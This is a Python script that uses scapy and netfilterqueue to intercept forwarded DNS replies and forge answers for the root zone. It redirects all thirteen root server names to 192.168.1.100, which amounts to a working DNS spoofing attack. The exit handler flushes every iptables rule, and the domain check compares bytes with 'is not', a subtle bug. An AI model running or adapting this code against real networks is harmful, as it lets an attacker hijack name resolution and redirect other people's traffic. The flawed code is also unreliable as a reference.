from __future__ import print_function
from scapy.all import *
from netfilterqueue import NetfilterQueue
import os

dns_root_server = b"."

def process_packet(packet):
    """
    Whenever a new packet is redirected to the netfilter queue,
    this callback is called.
    """
    # convert netfilter queue packet to scapy packet
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(DNSRR):
        # if the packet is a DNS Resource Record (DNS reply)
        # modify the packet

        print("[Before]:", scapy_packet.summary())
        try:
            scapy_packet = modify_packet(scapy_packet)
        except IndexError:
            # not UDP packet, this can be IPerror/UDPerror packets
            pass
        print("[After ]:", scapy_packet.summary())
        # set back as netfilter queue packet
        packet.set_payload(bytes(scapy_packet))
    # accept the packet
    packet.accept()


def modify_packet(packet):

    # get the DNS question name, the domain name
    qname = packet[DNSQR].qname
    if qname is not dns_root_server:
        # if the website isn't in our record
        # we don't wanna modify that
        print("no_modification:", qname)
        return packet
    print("modification:", qname)
    # craft new answer, overriding the original
    packet[DNS].an = DNSRR(rrname=qname, type=2, ttl=518400, rdata=b'a.root-servers.net')/DNSRR(rrname=qname, type=2, ttl=518400, rdata=b'b.root-servers.net')/DNSRR(rrname=qname, type=2, ttl=518400, rdata=b'c.root-servers.net')/DNSRR(rrname=qname, type=2, ttl=518400, rdata=b'd.root-servers.net')/DNSRR(rrname=qname, type=2, ttl=518400, rdata=b'e.root-servers.net')/DNSRR(rrname=qname, type=2, ttl=518400, rdata=b'f.root-servers.net')/DNSRR(rrname=qname, type=2, ttl=518400, rdata=b'g.root-servers.net')/DNSRR(rrname=qname, type=2, ttl=518400, rdata=b'h.root-servers.net')/DNSRR(rrname=qname, type=2, ttl=518400, rdata=b'i.root-servers.net')/DNSRR(rrname=qname, type=2, ttl=518400, rdata=b'j.root-servers.net')/DNSRR(rrname=qname, type=2, ttl=518400, rdata=b'k.root-servers.net')/DNSRR(rrname=qname, type=2, ttl=518400, rdata=b'l.root-servers.net')/DNSRR(rrname=qname, type=2, ttl=518400, rdata=b'm.root-servers.net')/DNSRR(rrname=b'a.root-servers.net', type=1, ttl=518400, rdata=b'192.168.1.100')/DNSRR(rrname=b'b.root-servers.net', type=1, ttl=518400, rdata=b'192.168.1.100')/DNSRR(rrname=b'c.root-servers.net', type=1, ttl=518400, rdata=b'192.168.1.100')/DNSRR(rrname=b'd.root-servers.net', type=1, ttl=518400, rdata=b'192.168.1.100')/DNSRR(rrname=b'e.root-servers.net', type=1, ttl=518400, rdata=b'192.168.1.100')/DNSRR(rrname=b'f.root-servers.net', type=1, ttl=518400, rdata=b'192.168.1.100')/DNSRR(rrname=b'g.root-servers.net', type=1, ttl=518400, rdata=b'192.168.1.100')/DNSRR(rrname=b'h.root-servers.net', type=1, ttl=518400, rdata=b'192.168.1.100')/DNSRR(rrname=b'i.root-servers.net', type=1, ttl=518400, rdata=b'192.168.1.100')/DNSRR(rrname=b'j.root-servers.net', type=1, ttl=518400, rdata=b'192.168.1.100')/DNSRR(rrname=b'k.root-servers.net', type=1, ttl=518400, rdata=b'192.168.1.100')/DNSRR(rrname=b'l.root-servers.net', type=1, ttl=518400, rdata=b'192.168.1.100')/DNSRR(rrname=b'm.root-servers.net', type=1, ttl=518400, rdata=b'192.168.1.100')
    # set the answer count to 13
    packet[DNS].ancount = 13
    # set the addictional count to 13
    packet[DNS].arcount = 13
    # delete checksums and length of packet, because we have modified the packet
    # new calculations are required ( scapy will do automatically )
    del packet[IP].len
    del packet[IP].chksum
    if packet.haslayer(UDP):
        del packet[UDP].len
        del packet[UDP].chksum
    if packet.haslayer(TCP):
        del packet[TCP].chksum

    # return the modified packet
    return packet


if __name__ == "__main__":
    QUEUE_NUM = 0
    # insert the iptables FORWARD rule
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
    # instantiate the netfilter queue
    queue = NetfilterQueue()
    try:
        # bind the queue number to our callback `process_packet`
        # and start it
        queue.bind(QUEUE_NUM, process_packet)
        queue.run()
    except KeyboardInterrupt:
        # if want to exit, make sure we
        # remove that rule we just inserted, going back to normal.
        os.system("iptables --flush")

